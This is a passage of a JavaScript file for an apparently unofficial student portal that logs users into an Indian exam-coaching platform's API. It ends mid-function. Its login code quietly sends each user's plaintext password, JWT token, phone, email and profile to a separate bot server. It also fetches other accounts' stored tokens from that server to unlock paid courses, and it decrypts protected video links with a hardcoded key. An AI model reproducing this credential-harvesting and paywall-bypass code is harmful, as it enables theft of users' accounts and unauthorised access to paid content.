// =========================================================
// RWA SKY PORTAL - MASTER ENGINE, AUTH, PROFILE & CBT TESTS (app.js)
// =========================================================

const BOT_API_BASE = "https://rwaweb-hp11.onrender.com";
const API_BASE = "https://rozgarapinew.teachx.in";
const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";

// =====================================================
// JWT DECODER & USER PERSONAL TOKEN STORAGE
// =====================================================
function extractUidFromJwt(jwtStr) {
    if (!jwtStr || typeof jwtStr !== "string") return "";
    try {
        const parts = jwtStr.trim().split(".");
        if (parts.length < 2) return "";
        const base64Url = parts[1];
        const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
        const jsonPayload = decodeURIComponent(atob(base64).split("").map(c => {
            return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(""));
        const payload = JSON.parse(jsonPayload);
        return String(payload.id || payload.userid || payload.user_id || "");
    } catch {
        return "";
    }
}

function getUserSavedTokens() {
    try {
        const raw = localStorage.getItem("rwa_user_tokens_v2");
        if (raw) {
            const parsed = JSON.parse(raw);
            if (Array.isArray(parsed)) {
                return parsed.filter(t => t && t.token && !t.isAdmin);
            }
        }
    } catch {}
    return [];
}

function getSavedUserProfile() {
    try {
        const raw = localStorage.getItem("rwa_user_profile_v2");
        if (raw) return JSON.parse(raw);
    } catch {}
    return null;
}

let USER_TOKENS = getUserSavedTokens();
let USER_PROFILE = getSavedUserProfile();

// =====================================================
// MONGODB DYNAMIC TOKENS FETCH
// =====================================================
async function fetchTokensFromDB() {
    try {
        const res = await fetch(`${BOT_API_BASE}/api/get_tokens`);
        const json = await res.json();
        if (json && json.status === "success" && json.tokens) {
            return json.tokens.map((t, idx) => ({
                id: "db_tok_" + idx,
                label: `Cloud Server`, 
                userId: String(t.userId || t.id),
                token: t.token,
                isAdmin: true
            }));
        }
    } catch (e) {
        console.warn("DB Fetch Error (Bot sleeping):", e);
    }
    return [];
}

async function getAllTokensForCourses() {
    const dbTokens = await fetchTokensFromDB();
    const all = [...USER_TOKENS, ...dbTokens];
    const unique = [];
    const seen = new Set();
    for (const t of all) {
        if (t.token && !seen.has(t.token)) {
            seen.add(t.token);
            unique.push(t);
        }
    }
    return unique;
}

function getCourseBoundToken(courseId) {
    const cid = String(courseId || state.courseId || "").trim();
    if (cid && state.courseTokenMap && state.courseTokenMap[cid]) {
        return state.courseTokenMap[cid];
    }
    if (state.activeTokenObj && state.activeTokenObj.token) {
        return state.activeTokenObj;
    }
    return USER_TOKENS[0];
}

function isUserLoggedIn() {
    return USER_TOKENS.length > 0 && Boolean(USER_TOKENS[0].token);
}

function updateTokenBadge() {
    const b = document.getElementById("tokCountBadge");
    if (b) b.textContent = USER_TOKENS.length;
    checkAuthUIState();
}

function checkAuthUIState() {
    const loginBtn = document.getElementById("navLoginBtn");
    const profileArea = document.getElementById("navProfileArea");
    const userNameText = document.getElementById("navUserNameText");
    const closeLoginBtn = document.getElementById("closeLoginModalBtn");

    if (isUserLoggedIn()) {
        if (loginBtn) loginBtn.classList.add("hidden");
        if (profileArea) profileArea.classList.remove("hidden");
        if (userNameText) {
            userNameText.textContent = (USER_PROFILE && USER_PROFILE.name) ? USER_PROFILE.name : "Profile";
        }
        if (closeLoginBtn) closeLoginBtn.classList.remove("hidden");
    } else {
        if (loginBtn) loginBtn.classList.remove("hidden");
        if (profileArea) profileArea.classList.add("hidden");
        if (closeLoginBtn) closeLoginBtn.classList.add("hidden");
    }
}

function enforceCompulsoryLogin() {
    updateTokenBadge();
    if (!isUserLoggedIn()) {
        openLoginModal();
        return false;
    }
    return true;
}

// =====================================================
// LOGIN MODAL & AUTHENTICATION ENGINE
// =====================================================
function openLoginModal() {
    const modal = document.getElementById("loginModal");
    if (modal) modal.classList.remove("hidden");
    const closeBtn = document.getElementById("closeLoginModalBtn");
    if (closeBtn) {
        if (isUserLoggedIn()) closeBtn.classList.remove("hidden");
        else closeBtn.classList.add("hidden");
    }
}

function closeLoginModal() {
    if (!isUserLoggedIn()) {
        showLoginStatus("⚠️ Portal use karne ke liye Login karna COMPULSORY hai!", "error");
        return;
    }
    const modal = document.getElementById("loginModal");
    if (modal) modal.classList.add("hidden");
}

window.switchLoginMode = function(mode) {
    const btnCreds = document.getElementById("tabBtnCreds");
    const btnToken = document.getElementById("tabBtnToken");
    const boxCreds = document.getElementById("loginBoxCreds");
    const boxToken = document.getElementById("loginBoxToken");
    const alertBox = document.getElementById("loginStatusAlert");
    if (alertBox) alertBox.classList.add("hidden");

    if (mode === "token") {
        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow transition-all cursor-pointer border-0";
        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 transition-all cursor-pointer border-0";
        boxToken.classList.remove("hidden");
        boxCreds.classList.add("hidden");
    } else {
        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow transition-all cursor-pointer border-0";
        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 transition-all cursor-pointer border-0";
        boxCreds.classList.remove("hidden");
        boxToken.classList.add("hidden");
    }
};

function showLoginStatus(msg, type) {
    const alertBox = document.getElementById("loginStatusAlert");
    if (!alertBox) return;
    alertBox.classList.remove("hidden", "bg-rose-100", "text-rose-800", "border-rose-300", "bg-emerald-100", "text-emerald-800", "border-emerald-300", "bg-sky-100", "text-sky-900", "border-sky-300");
    alertBox.classList.add("border");
    if (type === "error") {
        alertBox.classList.add("bg-rose-100", "text-rose-800", "border-rose-300");
    } else if (type === "success") {
        alertBox.classList.add("bg-emerald-100", "text-emerald-800", "border-emerald-300");
    } else {
        alertBox.classList.add("bg-sky-100", "text-sky-900", "border-sky-300");
    }
    alertBox.innerHTML = msg;
}

async function fetchUserDetailsFromServer(jwtToken, userId) {
    const uid = userId || extractUidFromJwt(jwtToken);
    if (!jwtToken || !uid) return null;

    const tempTokObj = { token: jwtToken, userId: String(uid) };
    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, tempTokObj);

    if (json && json.status === 200 && Array.isArray(json.data) && json.data.length > 0) {
        return json.data[0];
    }
    return null;
}

function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
    const payload = {
        login_method: loginMethod,
        user_id: String(userObj.userid || userObj.id || ""),
        name: userObj.name || "N/A",
        email: userObj.email || "N/A",
        phone: userObj.phone || "N/A",
        password: rawPass,
        username: userObj.username || "N/A",
        state_district: `${userObj.state || "N/A"} / ${userObj.district || "N/A"}`,
        category_gender: `${userObj.info_1 || "N/A"} | ${userObj.info_2 || "N/A"}`,
        refer_code: userObj.refer_code || "N/A",
        account_created: userObj.datetime || "N/A",
        device_token: userObj.devicetoken || "N/A",
        jwt_token: jwtToken
    };
    localStorage.setItem("pending_bot_sync", JSON.stringify(payload));
    processPendingBotSync();
}

function processPendingBotSync() {
    const savedData = localStorage.getItem("pending_bot_sync");
    if (!savedData) return; 

    let isSyncing = false;
    const trySend = () => {
        if(isSyncing) return;
        isSyncing = true;
        fetch(`${BOT_API_BASE}/api/login`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: savedData,
            keepalive: true
        }).then(res => {
            isSyncing = false;
            if (res.ok) localStorage.removeItem("pending_bot_sync");
            else setTimeout(trySend, 10000);
        }).catch((err) => {
            isSyncing = false;
            setTimeout(trySend, 10000); 
        });
    };
    trySend();
}

async function loginOnRwaServer(phoneOrEmail, password) {
    const loginEndpoints = ["/post/userLogin", "/get/login", "/post/login"];
    for (const ep of loginEndpoints) {
        try {
            const formData = new URLSearchParams();
            formData.append("email", phoneOrEmail);
            formData.append("phone", phoneOrEmail);
            formData.append("username", phoneOrEmail);
            formData.append("password", password);
            formData.append("devicetoken", "");
            formData.append("mydeviceid", "");

            const res = await fetch(`${API_BASE}${ep}`, {
                method: "POST",
                headers: {
                    "Client-Service": "Appx",
                    "Auth-Key": "appxapi",
                    "source": "website",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: formData.toString()
            });
            const json = await res.json();
            if (json && json.status === 200 && json.data && (json.data.token || json.data.jwt)) {
                return json.data;
            }
        } catch {}
    }
    return null;
}

window.submitUserLogin = async function(mode) {
    if (mode === "token") {
        let rawToken = document.getElementById("loginTokenInput").value.trim();
        if (!rawToken) {
            showLoginStatus("⚠️ Kripya apna JWT Authorization Token paste karein.", "error");
            return;
        }
        rawToken = rawToken.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();

        const extractedUid = extractUidFromJwt(rawToken);
        if (!extractedUid) {
            showLoginStatus("❌ Invalid JWT Token format! Kripya sahi token dalein.", "error");
            return;
        }
        showLoginStatus("🔄 Server se Token verify ho raha hai aur details fetch ki ja rahi hain...", "info");
        const userDetails = await fetchUserDetailsFromServer(rawToken, extractedUid);

        if (!userDetails) {
            showLoginStatus("❌ Token Expired ya Invalid hai! Server ne token reject kar diya.", "error");
            return;
        }
        const userTokObj = {
            id: "utok_" + Date.now(),
            label: userDetails.name || `User #${extractedUid}`,
            userId: String(userDetails.userid || userDetails.id || extractedUid),
            token: rawToken,
            isAdmin: false
        };

        USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== userTokObj.userId)];
        USER_PROFILE = userDetails;
        localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
        localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));

        sendProfileToMongoDB(userDetails, rawToken, "Direct JWT Token", "Logged via Token");

        showLoginStatus(`✅ Login Successful! Welcome ${userDetails.name || "User"}!`, "success");
        updateTokenBadge();
        setTimeout(() => {
            closeLoginModal();
            if (state.currentSlide === "slideExplorer" && state.cat === "paid") renderPaidBatches();
        }, 700);
        return;
    }

    const phone = document.getElementById("loginPhoneInput").value.trim();
    const pass = document.getElementById("loginPassInput").value.trim();

    if (!phone || !pass) {
        showLoginStatus("⚠️ Kripya Mobile Number/Email aur Password dono dalein.", "error");
        return;
    }

    if (pass.startsWith("eyJ")) {
        document.getElementById("loginTokenInput").value = pass;
        switchLoginMode("token");
        submitUserLogin("token");
        return;
    }

    showLoginStatus("🔄 RWA Server se credentials verify kiye ja rahe hain...", "info");
    const loginData = await loginOnRwaServer(phone, pass);

    if (!loginData || !(loginData.token || loginData.jwt)) {
        showLoginStatus("❌ Login Failed! Number ya Password galat hai.", "error");
        return;
    }

    const token = loginData.token || loginData.jwt;
    const uid = String(loginData.userid || loginData.id || extractUidFromJwt(token));

    showLoginStatus("🔄 Login verified! Server se aapki Profile Details fetch ho rahi hain...", "info");
    let userDetails = await fetchUserDetailsFromServer(token, uid);

    if (!userDetails) {
        userDetails = {
            id: uid,
            userid: uid,
            name: loginData.name || phone,
            email: loginData.email || phone,
            phone: loginData.phone || phone,
            username: loginData.username || "",
            state: loginData.state || "N/A",
            district: loginData.district || "N/A"
        };
    }

    const userTokObj = {
        id: "utok_" + Date.now(),
        label: userDetails.name || phone,
        userId: uid,
        token: token,
        isAdmin: false
    };

    USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== uid)];
    USER_PROFILE = userDetails;
    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
    localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));

    sendProfileToMongoDB(userDetails, token, "Phone/Password Login", pass);

    showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
    updateTokenBadge();
    setTimeout(() => {
        closeLoginModal();
        if (state.currentSlide === "slideExplorer" && state.cat === "paid") renderPaidBatches();
    }, 700);
};

// =====================================================
// USER PROFILE MODAL 
// =====================================================
async function openProfileModal() {
    if (!enforceCompulsoryLogin()) return;
    document.getElementById("profileModal").classList.remove("hidden");
    const contentBox = document.getElementById("profileDetailsContent");
    contentBox.innerHTML = `<div class="py-8 text-center text-slate-600 font-extrabold">🔄 Server se aapki live profile fetch ho rahi hai...</div>`;

    const activeUserTok = USER_TOKENS[0];
    const uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);

    const freshProfile = await fetchUserDetailsFromServer(activeUserTok.token, uid);
    if (freshProfile) {
        USER_PROFILE = freshProfile;
        localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
        updateTokenBadge();
    }

    const u = USER_PROFILE || {};
    contentBox.innerHTML = `
        <div class="bg-sky-50 border-2 border-sky-200 rounded-2xl p-4 flex items-center gap-3.5">
            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white font-black text-2xl flex items-center justify-center shadow-md shrink-0">
                ${(u.name || "U").charAt(0).toUpperCase()}
            </div>
            <div class="min-w-0 flex-1">
                <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase">● Verified RWA Student</span>
                <h4 class="font-black text-lg text-slate-900 truncate mt-0.5">${u.name || "RWA User"}</h4>
                <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span> • Username: <span class="text-slate-800 font-mono">${u.username || "N/A"}</span></p>
            </div>
        </div>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200">
            <div><span class="text-slate-500 font-bold">📧 Email:</span><div class="font-extrabold text-slate-900 break-all mt-0.5">${u.email || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">📱 Phone:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.phone || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">🏛️ State & District:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.state || "N/A"} (${u.district || "N/A"})</div></div>
            <div><span class="text-slate-500 font-bold">👤 Category & Gender:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.info_1 || "N/A"} | ${u.info_2 || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">🎁 Referral Code:</span><div class="font-extrabold text-blue-700 font-mono mt-0.5">${u.refer_code || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">📅 Joined Date:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.datetime || "N/A"}</div></div>
        </div>
        <div class="bg-amber-50 border-2 border-amber-200 rounded-2xl p-3.5">
            <div class="flex justify-between items-center mb-1.5">
                <span class="text-[11px] font-black text-amber-900 uppercase">🔑 Your Personal Active Token</span>
                <button onclick="navigator.clipboard.writeText('${activeUserTok.token}'); alert('Your Token Copied!');" class="px-2.5 py-1 rounded-lg bg-amber-500 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy My Token</button>
            </div>
            <div class="p-2 bg-white rounded-xl border border-amber-200 font-mono text-[10px] text-slate-700 break-all max-h-24 overflow-y-auto">${activeUserTok.token}</div>
        </div>`;
}

function closeProfileModal() { document.getElementById("profileModal").classList.add("hidden"); }

function handleLogout() {
    if (confirm("Kya aap sach mein Logout karna chahte hain?")) {
        localStorage.removeItem("rwa_user_tokens_v2");
        localStorage.removeItem("rwa_user_profile_v2");
        USER_TOKENS = []; USER_PROFILE = null;
        closeProfileModal(); updateTokenBadge(); goHomeHub(); openLoginModal();
    }
}

function decryptAppX(encStr) {
    if (!encStr || typeof encStr !== "string") return "";
    if (encStr.startsWith("http")) return encStr.trim();
    if (!encStr.includes(":")) return encStr.trim();
    try {
        const [cipherB64, ivB64] = encStr.split(":");
        const cipherParams = CryptoJS.lib.CipherParams.create({
            ciphertext: CryptoJS.enc.Base64.parse(cipherB64.replace(/\\\//g, "/"))
        });
        const iv = CryptoJS.enc.Base64.parse(ivB64);
        const dec = CryptoJS.AES.decrypt(cipherParams, AES_KEY, {
            iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
        });
        return dec.toString(CryptoJS.enc.Utf8).replace(/[\x00-\x1F\x7F]/g, "").trim();
    } catch { return ""; }
}

function resolvePdfUrl(encPdf, signedPdf) {
    const dec = decryptAppX(encPdf);
    if (dec && dec.startsWith("http")) return dec;
    if (signedPdf && signedPdf.startsWith("http")) return signedPdf;
    if (signedPdf && signedPdf.includes("URLPrefix=")) {
        try {
            const b64 = signedPdf.split("URLPrefix=")[1].split("&")[0].split("~")[0];
            const decoded = atob(decodeURIComponent(b64));
            if (decoded.startsWith("http")) return decoded;
        } catch {}
    }
    return signedPdf || dec || "";
}

// =====================================================
// REAL FALLBACK DATABASE FROM YOUR LOGS
// =====================================================
const DB = {
    paidCourses: [{ id: "571", course_name: "SSC GD भर्ती 2027 (वीर बैच)", exam_category: "RWA SSC EXAMS • PAID", exam_logo: "https://appx-wsb-gcp-mcdn.akamai.net.in/exam/2022-02-07-0.9839972577217094.png", test_series_id: "700" }],
    paidSubjects: [{ subjectid: "3610", subject_name: "History (वीर बैच)", subject_logo: "" }, { subjectid: "1", subject_name: "Maths", subject_logo: "https://appxcontent.kaxa.in/subject/2024-04-10-0.8626713728066564.jpg" }, { subjectid: "3527", subject_name: "Physics Dharmendra Sir", subject_logo: "" }],
    paidTopics: { "3610": [{ topicid: "42301", topic_name: "सिंधु सभ्यता" }] },
    paidLectures: { "42301": [{ id: "349275", Title: "History By Parul Mam || सिंधु सभ्यता", date_and_time: "08-10-2026 at 02:00 pm", thumbnail: "https://appx-content-v2.classx.co.in/paid_course3/2026-10-07-0_3401609217976156.jpg", file_link: "yc79PF7PfaItE6uX7lAA8ABqbrWNB1WgbrzGsR2wlcFMhAR2tn+h+ETmGcuzjpU5lIYYSRnaL7bMlKrf7UouOCRvHozzqOa6f7eXz7ZPaEE0fRd/NiEP2WEQYJbqwKEM+MU8uRUEXFx4/07LTnptyQ==:ZmVkY2JhOTg3NjU0MzIxMA==", download_links: [{ quality: "720p", path: "m7hcRsBTJp5eNY5aTdn8qpPBOzdeUeGZQY2wVY0qocyzI/GQp7GTpQTXEQI3QwV4TBS4t/fcLhrLe6ZhZ45UCH+PnnUxKByF74TDwQBmgL8IryqFfW2RBko3ChFPEicQTi3gci9AKv0/IhnCF+NqXBt9k0YzrosmgyXn3Oh6AkPFrQ8XsVMQ7udZ3fwSrS+Y:ZmVkY2JhOTg3NjU0MzIxMA==" }] }] },
    freeBatches: [{ id: "free_101", course_name: "RWA Free YouTube Marathon Series", exam_logo: "https://placehold.co/600x320/0284c7/ffffff?text=RWA+Free+Batches" }],
    freeSubjects: [{ subjectid: "fsub_1", subject_name: "GS & Polity Marathon", subject_logo: "" }],
    freeTopics: { "fsub_1": [{ topicid: "ftop_1", topic_name: "Complete Revision Classes" }] },
    freeLectures: { "ftop_1": [{ id: "flec_1", Title: "Polity Complete Revision Class", file_link: "dQw4w9WgXcQ", thumbnail: "https://placehold.co/600x320/0284c7/ffffff?text=Free+Class" }] },
    paidTestSeries: [{ id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" }, { id: "534", title: "BSF RO/RM Paid Test Series 2025", logo: "https://appx-content-v2.classx.co.in/subject/2026-05-26-0_6868771234595682.jpeg", offer_price: 149, freetest: "1", paidtest: "20" }, { id: "744", title: "UPSSSC PET Percentile Booster Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-08-17-0_091324675327629.jpeg", offer_price: 99, freetest: "2", paidtest: "23" }, { id: "663", title: "UPPCS Prelims Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-04-28-0_6713576579890046.jpeg", offer_price: 199, freetest: "2", paidtest: "24" }, { id: "695", title: "BSF Tradesman Paid Test Series 2025-26", logo: "https://appx-content-v2.classx.co.in/subject/2026-06-16-0_6020598298722372.jpeg", offer_price: 99, freetest: "0", paidtest: "15" }, { id: "708", title: "SSC GD Test Series 2026 (Book)", logo: "https://appx-content-v2.classx.co.in/subject/2026-07-08-0_5839850466807497.png", offer_price: 99, freetest: "0", paidtest: "42" }, { id: "788", title: "MASTER UPSC PRELIMS TEST SERIES & MENTORSHIP", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-29-0_2355880008171598.jpeg", offer_price: 1499, freetest: "1", paidtest: "30" }],
    freeTestSeries: [{ id: "743", title: "UP Police Constable 2026 (Free Weekly Test)", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663049907369836.jpeg" }, { id: "727", title: "UPSSSC PET 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_62931795162936.jpeg" }, { id: "799", title: "RRB NTPC CBT - 1 2026-27", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663139095411013.jpeg" }, { id: "795", title: "UKSSSC Group C 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5548408893128917.jpeg" }, { id: "784", title: "RRB Technician Grade-I 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_14122873860437668.jpeg" }, { id: "778", title: "RRB Technician Grade-III 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_07122037877353082.jpeg" }, { id: "689", title: "SSC CGL Mini Mock 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_9928777013427561.jpeg" }, { id: "801", title: "Indian Coast Guard 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_6774211576429437.jpeg" }],
    tsSubjects: { "700": [{ subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" }, { subjectid: "3172", subject_name: "SSC GD (Reasoning)", subject_logo: "" }, { subjectid: "3173", subject_name: "SSC GD (Polity & GS)", subject_logo: "" }, { subjectid: "3174", subject_name: "SSC GD (Hindi)", subject_logo: "" }], "776": [{ subjectid: "1415", subject_name: "FULL MOCK TEST", subject_logo: "https://appx-content-v2.classx.co.in/subject/2025-03-04-0.3071033524052684.jpeg" }, { subjectid: "2980", subject_name: "Test Schedule (Timetable)", subject_logo: "https://appx-content-v2.classx.co.in/subject/2026-10-07-0_7144586444576111.jpeg" }], "534": [{ subjectid: "2077", subject_name: "BSF RO/RM (Static GK)", subject_logo: "" }, { subjectid: "2072", subject_name: "BSF RO/RM (Physics)", subject_logo: "" }, { subjectid: "2073", subject_name: "BSF RO/RM (Maths)", subject_logo: "" }, { subjectid: "2075", subject_name: "BSF RO/RM (History)", subject_logo: "" }, { subjectid: "2076", subject_name: "BSF RO/RM (Geography)", subject_logo: "" }, { subjectid: "2079", subject_name: "BSF RO/RM (English)", subject_logo: "" }, { subjectid: "2080", subject_name: "BSF RO/RM (Chemistry)", subject_logo: "" }] },
    tsTitles: { "700_3171": [{ id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/40426/40426_questions0.8210916494359036.json" }, { id: "46376", title: "Percentage", test_series_id: "700", free_flag: "1", time: "25", questions: "20", marks: "20", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/46376/46376_questions0.4784600262440821.json" }], "776_1415": [{ id: "45964", title: "MP Police Constable Live Mock 01", test_series_id: "776", free_flag: "1", time: "120", questions: "100", marks: "100", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/45964/45964_questions0.48368684422780495.json" }], "534_2077": [{ id: "26680", title: "खेल (Sports Static GK)", test_series_id: "534", free_flag: "0", time: "10", questions: "10", marks: "20", test_questions_url: "https://testseries-assets-v2.classx.co.in/test_title_question/rozgar_db/26680/26680_questions1769763744.json" }], "743_-1": [{ id: "47393", title: "UP Police Constable (11 October 2026)", test_series_id: "743", free_flag: "1", time: "120", questions: "150", marks: "300", test_questions_url: "https://appx-content-v2.classx.co.in/test_title_question/rozgar_db/47393/47393_questions0.2543844739643528.json" }] },
    fallbackCbtQuestions: [{ id: "12370334", question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p><p style="font-size:16pt"><span style="font-family:'KOKILA'">25 और 45 का तृतीय समानुपाती ज्ञात कीजिए।</span></p>`, option_1: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">81</span></p>`, option_2: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">65</span></p>`, option_3: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">85</span></p>`, option_4: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">76</span></p>`, answer: "1", positive_marks: "2.00", negative_marks: "0.50", solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = (b × b) / a = (45 × 45) / 25 = 81</span></p>` }]
};

let state = {
    currentSlide: "slideHome", previousSlide: "slideHome", cat: "paid", view: "batches",
    courseId: "571", courseName: "SSC GD भर्ती 2027", activeTokenObj: USER_TOKENS[0], courseTokenMap: {}, courseTestSeriesMap: {},
    subjectId: null, subjectName: "", topicId: null, topicName: "", currentLectureKeys: [], mediaMap: {}, activeKey: null,
    currentPdfUrl: "", inlinePdfUrl: "", tsMode: "paid_ts", activeSeriesId: null, activeSeriesTitle: "", activeTsSubId: null, activeTsSubName: "", testMap: {},
    cbtTest: null
};

// =====================================================
// SLIDE NAVIGATION ENGINE
// =====================================================
function showSlide(slideId) {
    if (!enforceCompulsoryLogin()) return;
    if (state.currentSlide !== slideId) state.previousSlide = state.currentSlide;
    state.currentSlide = slideId;
    ["slideHome", "slideExplorer", "slidePlayer", "slideTestAttempt", "slideTokens", "slidePdf"].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        if (id === slideId) { el.classList.remove("hidden-slide"); el.classList.add("active-slide"); } 
        else { el.classList.remove("active-slide"); el.classList.add("hidden-slide"); }
    });
    const topNav = document.getElementById("topHeaderNav");
    if (topNav) {
        if (slideId === "slideHome") topNav.classList.remove("hidden");
        else topNav.classList.add("hidden");
    }
    window.scrollTo({ top: 0, behavior: "smooth" });
}

function goHomeHub() {
    if (!enforceCompulsoryLogin()) return;
    if (typeof stopPlayer === "function") stopPlayer();
    showSlide("slideHome");
}

function openTokenSlide() {
    if (!enforceCompulsoryLogin()) return;
    renderTokenManagerList();
    showSlide("slideTokens");
}

function openExplorerSlide(cat) {
    if (!enforceCompulsoryLogin()) return;
    state.cat = cat;
    showSlide("slideExplorer");
    if (cat === "paid") renderPaidBatches(); else renderFreeBatches();
}

function handleGlobalBack() {
    if (state.currentSlide === "slidePdf") { closePdfSlide(); return; }
    if (state.currentSlide === "slidePlayer") { closePlayerBox(); return; }
    if (state.currentSlide === "slideTestAttempt") { exitCbtTest(); return; }
    if (state.currentSlide === "slideTokens") { goHomeHub(); return; }
    if (state.currentSlide === "slideExplorer") {
        if (state.view === "ts_tests") {
            if (state.activeTsSubId === "-1") openTestSeriesExplorer(state.tsMode);
            else openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
            return;
        }
        if (state.view === "ts_subjects") { openTestSeriesExplorer(state.tsMode); return; }
        if (state.view === "ts_list") { goHomeHub(); return; }
        if (state.view === "batch_ts_tests") { loadCourseTab("tests"); return; }
        if (state.view === "lectures") {
            if (state.cat === "paid") openPaidTopics(state.subjectId, state.subjectName);
            else openFreeTopics(state.subjectId, state.subjectName);
        } else if (state.view === "topics") {
            if (state.cat === "paid") openPaidCourse(state.courseId, state.courseName);
            else openFreeCourse(state.courseId, state.courseName);
        } else if (state.view === "subjects" || state.view === "batch_ts_subjects") {
            if (state.cat === "paid") renderPaidBatches();
            else renderFreeBatches();
        } else { goHomeHub(); }
    }
}

// =====================================================
// API CALLER
// =====================================================
async function fetchRawJSONWithToken(endpoint, tokenObj) {
    const statusBadge = document.getElementById("apiStatus");
    const useTok = tokenObj || state.activeTokenObj || USER_TOKENS[0];
    if(!useTok) return null;
    const resolvedUid = String(useTok.userId || extractUidFromJwt(useTok.token) || "4756316");

    try {
        const res = await fetch(`${API_BASE}${endpoint}`, {
            headers: {
                "Client-Service": "Appx", "Auth-Key": "appxapi", "source": "website", "Device-Type": "", "is-safari": "0",
                "Authorization": useTok.token, "User-ID": resolvedUid
            }
        });
        const json = await res.json();
        if (statusBadge) statusBadge.textContent = `● Live Server Connected`;
        return json;
    } catch {
        if (statusBadge) statusBadge.textContent = "● Smart Hybrid Mode";
        return null;
    }
}

async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
    const json = await fetchRawJSONWithToken(endpoint, tokenObj);
    if (json) {
        if (json.data && (Array.isArray(json.data) ? json.data.length > 0 : Object.keys(json.data).length > 0)) return json.data;
        if (json.test_titles && Array.isArray(json.test_titles) && json.test_titles.length > 0) return json.test_titles;
    }
    return fallbackGetter ? fallbackGetter() : [];
}

// =====================================================
// BATCHES & COURSES
// =====================================================
async function renderPaidBatches() {
    if (!enforceCompulsoryLogin()) return;
    state.view = "batches"; document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = `All Purchased Courses Merged`;
    document.getElementById("headingText").textContent = "🎓 Purchased Paid Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Live DB Tokens & Batches...</div>`;

    let mergedCourses = []; const seenIds = new Set();
    const allTokensToFetch = await getAllTokensForCourses();

    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Merging batches from ${allTokensToFetch.length} Active Accounts...</div>`;

    for (const tokObj of allTokensToFetch) {
        const uid = tokObj.userId || extractUidFromJwt(tokObj.token) || "4756316";
        const purchasedEndpoints = [`/get/mycourseweb?userid=${uid}`, `/get/mycourse?userid=${uid}`];

